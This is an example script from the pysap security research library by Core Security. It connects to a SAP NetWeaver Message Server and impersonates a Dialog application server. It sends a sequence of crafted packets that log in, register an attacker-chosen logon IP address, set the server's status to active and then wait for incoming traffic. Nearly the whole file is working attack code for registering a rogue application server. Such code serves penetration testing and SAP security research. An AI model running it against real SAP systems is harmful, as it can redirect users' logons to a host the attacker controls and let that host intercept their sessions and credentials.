#!/usr/bin/env python
# ===========
# pysap - Python library for crafting SAP's network protocols packets
#
# Copyright (C) 2015 by Martin Gallo, Core Security
#
# The library was designed and developed by Martin Gallo from the Security
# Consulting Services team of Core Security.
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# ==============

# Standard imports
import logging
from optparse import OptionParser, OptionGroup
# External imports
from scapy.config import conf
# Custom imports
import pysap
from pysap.SAPMS import SAPMS, SAPMSProperty, SAPMSLogon
from pysap.SAPRouter import SAPRoutedStreamSocket


# Set the verbosity to 0
conf.verb = 0
conf.debug_dissector = True


# Command line options parser
def parse_options():

    description = \
    """This example script connects with the Message Server service of a SAP
    Netweaver Application Server and impersonates an application server
    registering as a Dialog instance server.

    """

    epilog = "pysap %(version)s - %(url)s - %(repo)s" % {"version": pysap.__version__,
                                                         "url": pysap.__url__,
                                                         "repo": pysap.__repo__}

    usage = "Usage: %prog [options] -d <remote host> -l <logon address>"

    parser = OptionParser(usage=usage, description=description, epilog=epilog)

    target = OptionGroup(parser, "Target")
    target.add_option("-d", "--remote-host", dest="remote_host", help="Remote host")
    target.add_option("-p", "--remote-port", dest="remote_port", type="int", help="Remote port [%default]", default=3900)
    target.add_option("-l", "--logon", dest="logon_address", help="Logon address")
    target.add_option("--route-string", dest="route_string", help="Route string for connecting through a SAP Router")
    parser.add_option_group(target)

    misc = OptionGroup(parser, "Misc options")
    misc.add_option("-c", "--client", dest="client", default="pysap's-impersonator", help="Client name [%default]")
    misc.add_option("-v", "--verbose", dest="verbose", action="store_true", default=False, help="Verbose output [%default]")
    parser.add_option_group(misc)

    (options, _) = parser.parse_args()

    if not options.remote_host:
        parser.error("Remote host is required")
    if not options.logon_address:
        parser.error("Logon address is required")

    return options


# Main function
def main():
    options = parse_options()

    if options.verbose:
        logging.basicConfig(level=logging.DEBUG)

    # Initiate the connection
    conn = SAPRoutedStreamSocket.get_nisocket(options.remote_host,
                                              options.remote_port,
                                              options.route_string,
                                              base_cls=SAPMS)
    print("[*] Connected to the message server %s:%d" % (options.remote_host, options.remote_port))

    # Set release information
    prop = SAPMSProperty(id=7, release="720", patchno=70, supplvl=0, platform=0)
    p = SAPMS(flag=0x01, iflag=0x01, toname="MSG_SERVER", fromname=options.client, opcode=0x43, property=prop)
    print("[*] Setting release information")
    conn.send(p)

    # Perform the login enabling the DIA+BTC+ICM services
    p = SAPMS(flag=0x08, iflag=0x08, msgtype=0x89, toname="-", fromname=options.client)
    print("[*] Sending login packet")
    conn.sr(p)[SAPMS]
    print("[*] Login performed")

    # Changing the status to starting
    p = SAPMS(flag=0x01, iflag=0x09, msgtype=0x05, toname="-", fromname=options.client)
    print("[*] Changing server's status to starting")
    conn.send(p)

    # Set IP address
    p = SAPMS(flag=0x01, iflag=0x01, toname="MSG_SERVER", fromname=options.client, opcode=0x06, opcode_version=0x01,
              change_ip_addressv4=options.logon_address)
    print("[*] Setting IP address")
    response = conn.sr(p)[SAPMS]
    print("[*] IP address set")
    response.show()

    # Set logon information
    l = SAPMSLogon(type=2, port=3200, address=options.logon_address, host=options.client, misc="LB=3")
    p = SAPMS(flag=0x01, iflag=0x01, msgtype=0x01, toname="MSG_SERVER", fromname=options.client, opcode=0x2b, logon=l)
    print("[*] Setting logon information")
    response = conn.sr(p)[SAPMS]
    print("[*] Logon information set")
    response.show()

    # Set the IP Address property
    prop = SAPMSProperty(client=options.client, id=0x03, address=options.logon_address)
    p = SAPMS(flag=0x02, iflag=0x01, toname="-", fromname=options.client,
              opcode=0x43, property=prop)
    print("[*] Setting IP address property")
    response = conn.sr(p)[SAPMS]
    print("[*] IP Address property set")
    response.show()

    # Changing the status to active
    p = SAPMS(flag=0x01, iflag=0x09, msgtype=0x01, toname="-", fromname=options.client)
    print("[*] Changing server's status to active")
    conn.send(p)

    # Wait for connections
    try:
        while (True):
            response = conn.recv()[SAPMS]
            response.show()

    except KeyboardInterrupt:
        print("[*] Cancelled by the user !")

    # Send MS_LOGOUT packet
    p = SAPMS(flag=0x00, iflag=0x04, toname="MSG_SERVER", fromname=options.client)
    print("[*] Sending logout packet")
    conn.send(p)


if __name__ == "__main__":
    main()
